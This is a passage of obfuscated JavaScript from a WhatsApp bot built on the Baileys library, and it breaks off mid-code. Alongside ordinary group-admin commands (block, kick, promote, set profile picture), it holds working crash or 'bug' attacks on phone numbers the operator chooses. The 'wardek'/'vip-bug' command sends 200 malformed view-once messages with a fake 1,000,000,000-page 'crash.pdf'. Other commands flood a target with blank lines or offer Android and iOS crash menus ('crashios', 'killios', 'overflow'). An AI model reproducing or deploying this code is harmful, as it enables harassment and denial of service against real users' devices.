        let _0x3a5bf0 = _0x21f0d9.quoted ? _0x21f0d9.quoted.sender : _0x40d288.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        if (_0x16cb12) {
          if (_0x3a5bf0) {
            await _0x4b53e5.updateBlockStatus(_0x3a5bf0, "unblock");
            await _0x3b9923("Successfully unblocked user");
          } else if (!q) {
            _0x3b9923("Please reply to the message or tag or input the number you want to block.");
          }
        } else if (!_0x16cb12) {
          if (q) {
            let _0x575a0d = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
            if (_0x575a0d.startsWith("08")) {
              return _0x3b9923("Awali nomer dengan 62");
            }
            if (!_0x575a0d.startsWith("62")) {
              return _0x3b9923("Please reply to the message or tag or input the number you want to block.");
            }
            await _0x4b53e5.updateBlockStatus(_0x575a0d, "unblock");
            _0x3b9923("Unblock success " + _0x575a0d);
          } else if (!q) {
            _0x3b9923("Enter the number you want to unblock");
          }
        }
        break;
      case "listblock":
        {
          let _0x53724e = await _0x4b53e5.fetchBlocklist();
          _0x3b9923("List Block :\n\n" + ("Total : " + (_0x53724e == undefined ? "*0* Blocked" : "*" + _0x53724e.length + "* Blocked") + "\n") + _0x53724e.map(_0x196cb0 => "• " + _0x196cb0.replace(/@.+/, "")).join`\n`);
        }
        break;
      case "setpp":
        {
          if (!_0x590e27) {
            return;
          }
          await _0x83640c(_0x21f0d9.chat, "🔁");
          if (_0x21f0d9.quoted) {
            const _0x30c196 = await _0x4b53e5.downloadAndSaveMediaMessage(_0x88ec1);
            const {
              img: _0x2d93c3
            } = await generateProfilePicture(_0x30c196);
            const _0x631c87 = {
              to: _0x47334e,
              type: "set",
              xmlns: "w:profile:picture"
            };
            const _0x1ef27d = {
              tag: "picture",
              attrs: {},
              content: _0x2d93c3
            };
            _0x1ef27d.attrs.type = "image";
            const _0x1a3c1c = {
              tag: "iq",
              attrs: _0x631c87,
              content: [_0x1ef27d]
            };
            await _0x4b53e5.query(_0x1a3c1c);
            await _0x3b9923("" + mess.success);
            await _0x83640c(_0x21f0d9.chat, "✅");
          } else {
            _0x3b9923("Reply to the photo");
          }
        }
        break;
      case "delpp":
        {
          if (!_0x590e27) {
            return;
          }
          _0x4b53e5.removeProfilePicture(_0x4b53e5.user.id);
          _0x3b9923(mess.succes);
        }
        break;
      case "setbio":
        {
          if (!_0x590e27) {
            return;
          }
          if (!q) {
            return _0x3b9923("Send command " + (_0x3a5987 + _0x4ae68c) + " name Example : " + _0x4ae68c + " Paijo");
          }
          await _0x4b53e5.updateProfileStatus(q);
          await _0x3b9923("Successfully changed bio status to *" + q + "*");
        }
        break;
      case "leavegc":
        {
          if (!_0x590e27) {
            return;
          }
          if (!_0x16cb12) {
            return;
          }
          await _0x4b53e5.groupLeave(_0x21f0d9.chat);
        }
        break;
      case "setppgroup":
      case "setppgrup":
      case "setppgc":
        {
          if (!_0x590e27) {
            return _0x3b9923(mess.usingsetpp);
          }
          if (!_0x16cb12) {
            return _0x3b9923(mess.ingroup);
          }
          await _0x83640c(_0x21f0d9.chat, "🔁");
          if (!_0x57a285) {
            return _0x3b9923(mess.admin);
          }
          if (!/image/.test(_0x5ed57c)) {
            return _0x3b9923("Send/Reply Image With Caption " + (_0x3a5987 + _0x4ae68c));
          }
          if (/webp/.test(_0x5ed57c)) {
            return _0x3b9923("Send/Reply Image With Caption " + (_0x3a5987 + _0x4ae68c));
          }
          let _0x108e4e = await _0x4b53e5.downloadAndSaveMediaMessage(_0x21f0d9);
          const _0x1b73f9 = {
            url: _0x108e4e
          };
          await _0x4b53e5.updateProfilePicture(_0x21f0d9.chat, _0x1b73f9).catch(_0x37087f => _0x4d1a4f.unlinkSync(_0x108e4e));
          _0x3b9923("done");
          await _0x83640c(_0x21f0d9.chat, "✅");
        }
        break;
      case "vasion":
        {
          if (!q) {
            return _0x3b9923("*Syntax Error!*\n\n_Use : VaSion Number_\n_Example : VaSion 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉");
          }
          let {
            proto: _0xcf231c,
            generateWAMessageFromContent: _0x3e802d
          } = require("@whiskeysockets/baileys");
          incTarget = _0x40d288.split("|")[0].replace(/[^0-9]/g, "");
          if (incTarget.startsWith("0")) {
            return _0x3b9923("*Syntax Error!*\n\n_Use : VaSion Number_\n_Example : VaSion 62xx_\n\n𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉");
          }
          let _0x3ebf09 = incTarget + "@s.whatsapp.net";
          if (owner.includes(incTarget)) {
            _0x3b9923("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!");
          } else {
            _0x3b9923(mess.bugrespon);
            global.jumlah = _0x40d288.split("|")[1];
            for (let _0xfe2604 = 0; _0xfe2604 < 1; _0xfe2604++) {
              await _0xe3a42f(_0x4b53e5, _0x3ebf09, _0x34a350, Ptcp = true);
              await _0x4ad2d9(_0x4b53e5, _0x3ebf09, _0x34a350, cct = true, ptcp = true);
              await _0xeec952(_0x4b53e5, _0x3ebf09, _0x34a350, cct = true, ptcp = true);
            }
            const _0x1a2413 = {
              url: _0x2c1fe4
            };
            const _0x20346f = {
              image: _0x1a2413
            };
            let _0x61e3b3 = _0x3e802d(_0x21f0d9.chat, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: _0xcf231c.Message.InteractiveMessage.create({
                    contextInfo: {
                      mentionedJid: [_0x21f0d9.sender],
                      isForwarded: true,
                      forwardingScore: 999,
                      forwardedNewsletterMessageInfo: {
                        newsletterJid: global.xchannel.jid,
                        newsletterName: "🩸⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡🦠️",
                        serverMessageId: -1
                      },
                      businessMessageForwardInfo: {
                        businessOwnerJid: _0x4b53e5.decodeJid(_0x4b53e5.user.id)
                      }
                    },
                    body: _0xcf231c.Message.InteractiveMessage.Body.create({
                      text: ""
                    }),
                    footer: _0xcf231c.Message.InteractiveMessage.Footer.create({
                      text: "©𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
                    }),
                    header: _0xcf231c.Message.InteractiveMessage.Header.create({
                      title: "「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊⭑̤",
                      subtitle: "",
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia(_0x20346f, {
                        upload: _0x4b53e5.waUploadToServer
                      }))
                    }),
                    nativeFlowMessage: _0xcf231c.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        name: "quick_reply",
                        buttonParamsJson: "{\"display_text\":\"🎭⃟༑⌁⃰𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕ཀ͜͡🐉\",\"id\":\"invisixinfinite " + incTarget + "\"}"
                      }]
                    })
                  })
                }
              }
            }, {});
            await _0x4b53e5.relayMessage(_0x61e3b3.key.remoteJid, _0x61e3b3.message, {
              messageId: _0x61e3b3.key.id
            });
            await donebug(_0x3d8576);
          }
        }
        break;
      case "editdes":
        {
          if (!_0x16cb12) {
            return _0x3b9923(mess.ingroup);
          }
          if (!_0x3774e0) {
            return _0x3b9923(mess.notadmin);
          }
          if (!q) {
            return _0x3b9923("Example *" + (_0x3a5987 + _0x4ae68c) + " hi everyone im chucky*");
          }
          await _0x83640c(_0x21f0d9.chat, "🔁");
          await _0x4b53e5.groupUpdateSubject(_0x21f0d9.chat, _0x40d288);
          await _0x83640c(_0x21f0d9.chat, "✅");
        }
        break;
      case "setgcname":
        {
          if (!_0x16cb12) {
            return _0x3b9923(mess.ingroup);
          }
          if (!_0x3774e0) {
            return _0x3b9923(mess.notadmin);
          }
          if (!q) {
            return _0x3b9923("Example *" + (_0x3a5987 + _0x4ae68c) + " Chucky gc*");
          }
          await _0x83640c(_0x21f0d9.chat, "🔁");
          await _0x4b53e5.groupUpdateDescription(_0x21f0d9.chat, _0x40d288);
          await _0x83640c(_0x21f0d9.chat, "✅");
        }
        break;
      case "linkgroup":
      case "linkgc":
        {
          if (!_0x16cb12) {
            return _0x3b9923(mess.ingroup);
          }
          if (!_0x3774e0) {
            return _0x3b9923(mess.notadmin);
          }
          await _0x83640c(_0x21f0d9.chat, "🔁");
          let _0x51588c = await _0x4b53e5.groupInviteCode(_0x21f0d9.chat);
          _0x4b53e5.sendText(_0x21f0d9.chat, "https://chat.whatsapp.com/" + _0x51588c + "\n\nLink Group : " + _0x4ba20d.subject, _0x21f0d9, {
            detectLink: true
          });
          await _0x83640c(_0x21f0d9.chat, "✅");
        }
        break;
      case "resetlinkgc":
      case "revoke":
        {
          if (!_0x16cb12) {
            return _0x3b9923(mess.ingroup);
          }
          if (!_0x3774e0) {
            return _0x3b9923(mess.notadmin);
          }
          await _0x83640c(_0x21f0d9.chat, "🔁");
          _0x4b53e5.groupRevokeInvite(_0x21f0d9.chat);
          await _0x83640c(_0x21f0d9.chat, "✅");
        }
        break;
      case "linkgc":
        {
          if (!_0x16cb12) {
            return _0x3b9923(mess.ingroup);
          }
          if (!_0x3774e0) {
            return _0x3b9923(mess.notadmin);
          }
          await _0x83640c(_0x21f0d9.chat, "🔁");
          let _0x4f8376 = await _0x4b53e5.groupInviteCode(_0x21f0d9.chat);
          _0x3b9923("https://chat.whatsapp.com/" + _0x4f8376 + "\n\nLink Group : " + _0x4ba20d.subject);
          await _0x83640c(_0x21f0d9.chat, "✅");
        }
        break;
      case "kick":
        {
          if (!_0x16cb12) {
            return _0x3b9923(mess.ingroup);
          }
          if (!_0x3774e0) {
            return _0x3b9923(mess.notadmin);
          }
          if (!_0x57a285) {
            return _0x3b9923(mess.admin);
          }
          await _0x83640c(_0x21f0d9.chat, "🔁");
          let _0x3e0713 = _0x21f0d9.mentionedJid[0] ? _0x21f0d9.mentionedJid[0] : _0x21f0d9.quoted ? _0x21f0d9.quoted.sender : _0x40d288.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x4b53e5.groupParticipantsUpdate(_0x21f0d9.chat, [_0x3e0713], "remove");
          _0x3b9923(mess.done);
          await _0x83640c(_0x21f0d9.chat, "✅");
        }
        break;
      case "add":
        {
          if (!_0x16cb12) {
            return _0x3b9923(mess.ingroup);
          }
          if (!_0x3774e0) {
            return _0x3b9923(mess.notadmin);
          }
          if (!_0x57a285) {
            return _0x3b9923(mess.admin);
          }
          await _0x83640c(_0x21f0d9.chat, "🔁");
          let _0x1ad7df = _0x21f0d9.quoted ? _0x21f0d9.quoted.sender : _0x40d288.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x4b53e5.groupParticipantsUpdate(_0x21f0d9.chat, [_0x1ad7df], "add");
          _0x3b9923(mess.done);
          await _0x83640c(_0x21f0d9.chat, "✅");
        }
        break;
      case "promote":
        {
          if (!_0x16cb12) {
            return _0x3b9923(mess.ingroup);
          }
          if (!_0x3774e0) {
            return _0x3b9923(mess.notadmin);
          }
          if (!_0x57a285) {
            return _0x3b9923(mess.admin);
          }
          await _0x83640c(_0x21f0d9.chat, "🔁");
          let _0x4fa398 = _0x21f0d9.mentionedJid[0] ? _0x21f0d9.mentionedJid[0] : _0x21f0d9.quoted ? _0x21f0d9.quoted.sender : _0x40d288.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x4b53e5.groupParticipantsUpdate(_0x21f0d9.chat, [_0x4fa398], "promote");
          _0x3b9923(mess.done);
          await _0x83640c(_0x21f0d9.chat, "✅");
        }
        break;
      case "demote":
        {
          if (!_0x16cb12) {
            return _0x3b9923(mess.ingroup);
          }
          if (!_0x3774e0) {
            return _0x3b9923(mess.notadmin);
          }
          if (!_0x57a285) {
            return _0x3b9923(mess.admin);
          }
          await _0x83640c(_0x21f0d9.chat, "🔁");
          let _0x48cdde = _0x21f0d9.mentionedJid[0] ? _0x21f0d9.mentionedJid[0] : _0x21f0d9.quoted ? _0x21f0d9.quoted.sender : _0x40d288.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await _0x4b53e5.groupParticipantsUpdate(_0x21f0d9.chat, [_0x48cdde], "demote");
          _0x3b9923(mess.done);
          await _0x83640c(_0x21f0d9.chat, "✅");
        }
        break;
      case "hidetag":
        {
          if (!_0x16cb12) {
            return _0x3b9923(mess.ingroup);
          }
          if (!_0x3774e0) {
            return _0x3b9923(mess.notadmin);
          }
          if (!_0x57a285) {
            return _0x3b9923(mess.admin);
          }
          await _0x83640c(_0x21f0d9.chat, "🔁");
          _0x4b53e5.sendMessage(_0x21f0d9.chat, {
            text: q ? q : "",
            mentions: _0x349e8b.map(_0x3f7894 => _0x3f7894.id)
          }, {
            quoted: _0x21f0d9
          });
          await _0x83640c(_0x21f0d9.chat, "✅");
        }
        break;
      case "antigedor":
      case "sodok-Marx":
      case "vip-bug":
      case "marx-bantai":
      case "wardek":
        {
          if (!_0x2054ca) {
            return _0x3b9923(mess.premium);
          }
          if (!_0x40d288) {
            return _0x3b9923("Usage ." + _0x4ae68c + " 2341234567890");
          }
          let _0x31413d = q.replace(/[^0-9]/g, "");
          if (_0x31413d.startsWith("0")) {
            return _0x3b9923("Example : " + (_0x3a5987 + _0x4ae68c) + " 2341234567890");
          }
          var _0x314537 = await _0x4b53e5.onWhatsApp(_0x31413d + "@s.whatsapp.net");
          let _0x5df129 = _0x31413d + "@s.whatsapp.net";
          if (["916909137213", "919366316008", "919402104403"].includes(_0x31413d)) {
            return;
          }
          if (_0x314537.length == 0) {
            return _0x3b9923("The number is not registered on WhatsApp");
          }
          const _0x35efed = {
            title: "𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕; ",
            hasMediaAttachment: true,
            imageMessage: _0x34a350.imageMessage
          };
          const _0x1fa659 = _0x35efed;
          const _0x4fec93 = {
            text: ""
          };
          async function _0x2c44a2(_0x51bb2a) {
            await _0x4b53e5.relayMessage(_0x51bb2a, {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    header: _0x1fa659,
                    body: _0x4fec93,
                    nativeFlowMessage: {
                      buttons: [{
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                          header: "𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕␤; ",
                          body: "xxx",
                          flow_action: "navigate",
                          flow_action_payload: {
                            screen: "FORM_SCREEN"
                          },
                          flow_cta: "xxxxx",
                          flow_id: "1169834181134583",
                          flow_message_version: "3",
                          flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                        })
                      }],
                      messageParamsJson: ""
                    },
                    contextInfo: {
                      isForwarded: true,
                      fromMe: false,
                      participant: "0@s.whatsapp.net",
                      remoteJid: _0x51bb2a,
                      quotedMessage: {
                        documentMessage: {
                          url: "https://mmg.whatsapp.net/v/t62.7119-24/34673265_965442988481988_3759890959900226993_n.enc?ccb=11-4&oh=01_AdRGvYuQlB0sdFSuDAeoDUAmBcPvobRfHaWRukORAicTdw&oe=65E730EB&_nc_sid=5e03e0&mms3=true",
                          mimetype: "application/pdf",
                          title: "crash",
                          pageCount: 1000000000,
                          fileName: "crash.pdf",
                          contactVcard: true
                        }
                      },
                      forwardedNewsletterMessageInfo: {
                        newsletterJid: "120363222395675670@newsletter",
                        serverMessageId: 1,
                        newsletterName: "𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                      }
                    }
                  }
                }
              }
            }, {});
          }
          for (let _0x5a0b9c = 0; _0x5a0b9c < 200; _0x5a0b9c++) {
            await _0x2c44a2(_0x5df129);
          }
          _0x327804("Successfully Sent Bug To @" + _0x5df129.split("@")[0] + " Using *" + _0x4ae68c + "* ✅\n\nPause 2 minutes so that the bot is not banned.", [_0x21f0d9.chat]);
        }
        break;
      case "clear-bug":
        {
          _0x3b9923(" command received ");
          fixedbug("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
        }
        break;
      case "ai":
        if (_0x13e106.length < 1) {
          return _0x3b9923("choose the option on/off");
        }
        if (q == "on") {
          global.db.data.chats[_0x21f0d9.chat].ai = true;
          _0x3b9923("Successfully activated AI chat");
        } else if (q == "off") {
          global.db.data.chats[_0x21f0d9.chat].ai = false;
          _0x3b9923("Successfully deactivated AI chat");
        } else {
          _0x3b9923("wrong usage!!!, the option is .ai on/off");
        }
        break;
      case "clear":
        if (!_0x2054ca) {
          return _0x3b9923(mess.premium);
        }
        if (!q) {
          return _0x3b9923("Example:\n " + (_0x3a5987 + _0x4ae68c) + " 234xxxx");
        }
        Pe = _0x21f0d9.mentionedJid[0] ? _0x21f0d9.mentionedJid[0] : _0x21f0d9.quoted ? _0x21f0d9.quoted.sender : q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        _0x4b53e5.sendMessage(target, {
          text: "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"
        });
        _0x3b9923("done");
        break;
      case "appvn":
        {
          const _0x431d94 = require("cheerio");
          async function _0xd7405f(_0xcfb6ff) {
            const _0x47de5e = "https://appvn.com";
            const _0x22d20f = await fetch(_0x47de5e + "/android/search?keyword=" + _0xcfb6ff);
            const _0x5cd0ae = await _0x22d20f.text();
            const _0x4c61d2 = _0x431d94.load(_0x5cd0ae);
            const _0x21b529 = [];
            _0x4c61d2("div.section-content li.item").each((_0x1dbaa5, _0x527ce3) => {
              const _0x505709 = {
                title: _0x4c61d2(_0x527ce3).find("div.info > a").text().trim(),
                url: _0x47de5e + _0x4c61d2(_0x527ce3).find("div.info > a").attr("href"),
                image: _0x4c61d2(_0x527ce3).find("img.lazy").attr("data-src"),
                version: _0x4c61d2(_0x527ce3).find("div.vol-chap.ver.text-left > p:first-child").text().trim(),
                date: _0x4c61d2(_0x527ce3).find("div.vol-chap.ver.text-left > p.new-chap").text().trim(),
                author: _0x4c61d2(_0x527ce3).find("div.new-chap.author > a").text().trim(),
                detailLink: _0x47de5e + _0x4c61d2(_0x527ce3).find("div.btn.btn-download > a").attr("href")
              };
              _0x21b529.push(_0x505709);
            });
            return _0x21b529;
          }
          if (!_0x40d288) {
            return _0x3b9923(_0x21f0d9.from, "```🚩 Example : .appvn idle```", _0x21f0d9);
          }
          _0x3b9923(_0x21f0d9.from, "wait a minute...", _0x21f0d9);
          try {
            let _0x491851 = await _0xd7405f(_0x40d288);
            if (_0x491851.length > 0) {
              let _0x513867 = "Search results:\n\n";
              _0x491851.forEach((_0x2d48c4, _0x2ab6b8) => {
                _0x513867 += "Title: " + _0x2d48c4.title + "\nVersion: " + _0x2d48c4.version + "\nDeveloper: " + _0x2d48c4.author + "\nURL: " + _0x2d48c4.url + "\n\n";
              });
              _0x3b9923(_0x21f0d9.from, _0x513867, _0x21f0d9);
            } else {
              _0x3b9923(_0x21f0d9.from, "No result.", _0x21f0d9);
            }
          } catch (_0xe33693) {
            console.error("Error fetching data:", _0xe33693);
            _0x3b9923(_0x21f0d9.from, "An error occurred while searching. Please try again later.", _0x21f0d9);
          }
        }
        break;
      case "leornado":
        {
          if (!q) {
            return _0x3b9923("Example: " + (_0x3a5987 + _0x4ae68c) + " 234xxx");
          }
          target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          const _0xb69aa6 = {
            title: "⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟",
            highlight_label: "⚜️⃟ ⌁⃫⃰𝐋𝐞⃑𝐨𝐫⃕𝐧𝐚𝐝⃩𝐨⃭⃝⃧💫",
            rows: [{
              title: "⌁⃫⃰𝐋𝐞⃑𝐨𝐫⃕𝐧𝐚𝐝⃩𝐨⃭⃝⃧ 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧",
              id: "vip " + target
            }]
          };
          const _0x1bb9b1 = {
            highlight_label: "🔴⃟⌁⃰𝐙𝐫͢𝐧𝟏 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡💫",
            rows: [{
              title: "⌁⃰𝐙𝐫͢𝐧𝟏",
              id: "andro " + target
            }]
          };
          const _0x25e6a5 = {
            highlight_label: "🔵⃟⌁⃰𝐙𝐫͢𝐧𝟐 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡💫",
            rows: [{
              title: "⌁⃰𝐙𝐫͢𝐧𝟐",
              id: "attack " + target
            }]
          };
          const _0x422a11 = {
            title: "⌜ 𝐈𝚯𝐒 ⌟",
            highlight_label: "🚫⃟ ⌁⃰𝐀𝐩𝐩𝐥𝐞͢ཀ͜͡💫",
            rows: [{
              title: "⌁⃰𝐂͢𝐫𝐚ͯ𝐬͢𝐡 𝐥͢𝐨ͮ𝐬༑",
              id: "crashios " + target
            }]
          };
          const _0x380349 = {
            highlight_label: "⛔️⃟ ⌁⃰𝐀𝐩𝐩𝐥𝐞͢ཀ͜͡💫",
            rows: [{
              title: "⌁⃫⃰𝐋𝐞⃑𝐨𝐫⃕𝐧𝐚𝐝⃩𝐨⃭⃝⃧ 𝐈𝐨ͮ͢𝐒༑",
              id: "killios " + target
            }]
          };
          const _0x4d6032 = {
            highlight_label: "🟡⃟ ⌁⃰𝐀𝐩𝐩𝐥𝐞͢ཀ͜͡💫",
            rows: [{
              title: "⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑",
              id: "trashios " + target
            }]
          };
          const _0x21d15e = {
            title: "⌜ 𝐋𝐄𝐎𝐑𝐍𝐀𝐃𝐎 ⌟",
            highlight_label: "🚯⃟⌁⃰𝐙𝐫͢𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡💫",
            rows: [{
              title: "⌁⃰𝐂͢𝐫𝐚ͯ𝐬͢𝐡𝐅𝐥͢𝐨ͮ𝐰༑",
              id: "crashflow " + target
            }]
          };
          const _0x5f345b = {
            highlight_label: "🙂‍↔️⃟ ⌁⃫⃰𝐋𝐞⃑𝐨𝐫⃕𝐧𝐚𝐝⃩𝐨⃭⃝⃧💫",
            rows: [{
              title: "⌁⃫⃰𝐋𝐞⃑𝐨𝐫⃕𝐧𝐚𝐝⃩𝐨⃭⃝⃧ �͢𝐫𝐚ͯ𝐬͢𝐡",
              id: "leorcrash " + target
            }]
          };
          const _0xb9d9f4 = {
            highlight_label: "☢️⃟⌁⃰𝐙𝐫͢𝐧 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡💫",
            rows: [{
              title: "⌁⃰𝚯𝐯ͯ͢𝐞𝐫ͮ𝐅𝐥͢𝐨ͯ𝐰༑",
              id: "overflow " + target
            }]
          };
          let _0x1b6541 = [_0xb69aa6, _0x1bb9b1, _0x25e6a5, _0x422a11, _0x380349, _0x4d6032, _0x21d15e, _0x5f345b, _0xb9d9f4];
          const _0xc5a0bf = {
            title: "⿻𝐋𝐄𝐎𝐑𝐍𝐀𝐃𝐎 𝐃𝐈𝐀𝐘𝐈",
            sections: _0x1b6541
          };
          let _0x32498e = _0xc5a0bf;
          const _0x493488 = {
            text: "𝐀𝐓𝐓𝐀𝐂𝐊 : " + target
          };
          let _0x29aeaa = _0x770315(_0x21f0d9.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: _0xda26e2.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x21f0d9.sender],
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                      newsletterJid: "0@newsletter",
                      newsletterName: "Powered By Leornado",
                      serverMessageId: -1
                    },
                    businessMessageForwardInfo: {
                      businessOwnerJid: _0x4b53e5.decodeJid(_0x4b53e5.user.id)
                    }
                  },
                  body: _0xda26e2.Message.InteractiveMessage.Body.create(_0x493488),
                  footer: _0xda26e2.Message.InteractiveMessage.Footer.create({
                    text: ""
                  }),
                  header: _0xda26e2.Message.InteractiveMessage.Header.create({
                    title: "",
                    subtitle: "𝐋𝐄𝐎𝐑𝐍𝐀𝐃𝐎 𝐃𝐈𝐀𝐘𝐈",
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia({
                      image: await _0x4d1a4f.readFileSync("./database/image/xbug.jpg")
                    }, {
                      upload: _0x4b53e5.waUploadToServer
                    }))
                  }),
                  nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify(_0x32498e)
                    }, {
                      name: "cta_url",
                      buttonParamsJson: "{\"display_text\":\"My Creator\",\"url\":\"https://youtube.con/@janelle.zyoffc\",\"merchant_url\":\"https://youtube.com/@janelle.zyoffc\"}"
                    }]
                  })
                })
              }
            }
          }, {});
          await _0x4b53e5.relayMessage(_0x29aeaa.key.remoteJid, _0x29aeaa.message, {
            messageId: _0x29aeaa.key.id
          });
        }
        break;
      case "invi":
        {
          if (!q) {
            return _0x3b9923("*Syntax Error!*\n\n_Use :  Number_\n_Example : Zero 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️");
          }
          let {
            proto: _0x4d4c71,
            generateWAMessageFromContent: _0x2d682d
          } = require("@whiskeysockets/baileys");
          incTarget = _0x40d288.split("|")[0].replace(/[^0-9]/g, "");
          if (incTarget.startsWith("0")) {
            return _0x3b9923("*Syntax Error!*\n\n_Use : Zero Number_\n_Example : Zero 62xx_\n\n𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️");
          }
          let _0x2c52df = incTarget + "@s.whatsapp.net";
          if (owner.includes(incTarget)) {
            _0x3b9923("𝙁𝙖𝙞𝙡𝙚𝙙 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 𝙊𝙬𝙣𝙚𝙧!!");
          } else {
            _0x3b9923(mess.bugrespon);
            global.jumlah = _0x40d288.split("|")[1];
            for (let _0x3f5ec3 = 0; _0x3f5ec3 < 1; _0x3f5ec3++) {
              await _0x52b53e(_0x2c52df);
            }
            const _0x3a7ebe = {
              url: _0x2c1fe4
            };
            const _0x3f1b94 = {
              image: _0x3a7ebe
            };
            let _0x4cd4c9 = _0x2d682d(_0x21f0d9.chat, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: _0x4d4c71.Message.InteractiveMessage.create({
                    contextInfo: {
                      mentionedJid: [_0x21f0d9.sender],
                      isForwarded: true,
                      forwardingScore: 999,
                      forwardedNewsletterMessageInfo: {
                        newsletterJid: "0@newsletter",
                        newsletterName: "🩸𝐉𝐚𝐜𝐤 𝐂𝐫𝐚𝐬𝐡 ϟ🦠️",
                        serverMessageId: -1
                      },
                      businessMessageForwardInfo: {
                        businessOwnerJid: _0x4b53e5.decodeJid(_0x4b53e5.user.id)
                      }
                    },
                    body: _0x4d4c71.Message.InteractiveMessage.Body.create({
                      text: ""
                    }),
                    footer: _0x4d4c71.Message.InteractiveMessage.Footer.create({
                      text: "©𝐉𝐀𝐂𝐊𝐓𝐇𝐄𝐗𝐁𝐄𝐂〽️"
                    }),
                    header: _0x4d4c71.Message.InteractiveMessage.Header.create({
